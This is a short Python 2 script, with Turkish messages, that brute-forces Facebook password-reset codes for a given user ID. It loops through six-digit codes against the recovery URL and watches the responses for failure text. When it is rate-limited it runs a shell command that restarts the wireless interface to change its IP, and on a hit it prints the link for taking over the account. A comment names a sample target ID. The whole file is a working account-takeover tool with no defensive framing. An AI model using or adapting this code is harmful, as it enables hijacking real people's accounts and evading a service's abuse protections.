import mechanize
import sys
from os import system
br = mechanize.Browser()
br.set_handle_robots(False)

###d***z id: 100011538078417


try:
	id = sys.argv[1]
	print "[+] id found."
except:
	print "[!] id is not found."
	exit()


try:
	sayi = int(sys.argv[2])
except:
	sayi = 100100

try:
	son = int(sys.argv[3])
except:
	son = 999999


ip_sifirla = "sudo ifconfig wlan0 down;sleep 3;sudo ifconfig wlan0 up > /dev/null"

try:
	while int(sayi) < int(son):
	        try:
			link = "https://www.beta.facebook.com/recover/password?u=" + id + "&n=" + str(sayi)
			req = br.open(link)
			html = req.read()
			sayi += 1
			if "tekrar dene" in html:
				print "[!] unsuccessful : " + id + "  " + str(sayi)
			elif "deniyorsun" in html:
				system(ip_sifirla)
				print "[!] ip adresi degistirldi.."
				sayi -= 1
			else:
				print "-" * 20 + "SUCCESS" + "-" * 20
				print "[+] successful : " + id + "  " + str(sayi)
				print "[++] Bunu ac :", link
				print "-" * 20 + "SUCCESS" + "-" * 20
		except:
			print "[-] Acildamadi..."
			sayi -= 1
except:
	print "Excepte Dustu"
	exit()
